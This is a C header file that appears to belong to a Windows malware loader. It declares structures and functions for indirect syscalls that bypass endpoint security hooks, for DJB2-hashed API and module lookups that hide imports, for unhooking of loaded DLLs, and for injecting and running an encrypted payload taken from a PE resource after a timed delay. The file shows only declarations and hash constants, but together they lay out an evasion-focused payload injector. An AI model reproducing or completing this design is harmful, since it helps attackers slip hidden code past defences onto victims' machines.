#pragma once

#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H


//
#define DELAY


// CONSTANTS
#define PAYLOAD_EXEC_DELAY                      0x0A            // 10 Seconds delay before executing the payload
#define	KEY_SIZE                                0x20            // 32
#define	IV_SIZE                                 0x10            // 16
#define STATUS_OBJECT_NAME_NOT_FOUND            0xC0000034      // 'The object name is not found' - Returned by NtOpenSection in unhook.c if the dll is not found in \knowndlls\

// HASHES
#define NtOpenSection_DJB2                      0x17CFA34E
#define NtMapViewOfSection_DJB2                 0x231F196A
#define NtProtectVirtualMemory_DJB2             0x082962C8
#define NtUnmapViewOfSection_DJB2               0x595014AD
#define NtAllocateVirtualMemory_DJB2            0x6793C34C
#define NtDelayExecution_DJB2                   0x0A49084A

#define LoadLibraryA_DJB2                       0x5FBFF0FB

#define CreateThreadpoolTimer_DJB2              0x0B49144C
#define SetThreadpoolTimer_DJB2                 0x3B944C24
#define WaitForSingleObject_DJB2                0xECCDA1BA

#define text_DJB2               0x0B80C0D8
#define win32udll_DJB2          0x34C755B7
#define kernel32dll_DJB2        0x7040EE75
#define ntdlldll_DJB2           0x22D3B5ED

//--------------------------------------------------------------------------------------------------------------------------------------------------
// HELLSHALL.C

typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // Syscall number
    DWORD dwSyscallHash;            // Syscall hash value
    PVOID pSyscallInstAddress;      // Address of a random 'syscall' instruction in win32u.dll    

}NT_SYSCALL, * PNT_SYSCALL;


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys);
extern VOID SetSSn(IN DWORD dwSSn, IN PVOID pSyscallInstAddress);
extern RunSyscall();


#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))

//--------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API {


    NT_SYSCALL	NtOpenSection;
    NT_SYSCALL	NtMapViewOfSection;
    NT_SYSCALL	NtProtectVirtualMemory;
    NT_SYSCALL	NtUnmapViewOfSection;
    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL  NtDelayExecution;

    BOOL        bInit;

}NT_API, * PNT_API;


//--------------------------------------------------------------------------------------------------------------------------------------------------
// COMMON.C

BOOL InitIndirectSyscalls(OUT PNT_API Nt);
unsigned int GenerateRandomInt();
DWORD HashStringDjb2A(IN LPCSTR String);
VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource);
VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);

#define DJB2HASH(STR)    ( HashStringDjb2A( (LPCSTR)STR ) )

//--------------------------------------------------------------------------------------------------------------------------------------------------
// UNHOOK.C

VOID UnhookAllLoadedDlls();
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// APIHASHING.C

HMODULE GetModuleHandleH(IN UINT32 uModuleHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// INJECT.C

BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);
VOID ExecutePayload(IN PVOID pInjectedPayload);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// RSRCPAYLOAD.C

BOOL GetResourcePayload(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);


#endif // !COMMON_H
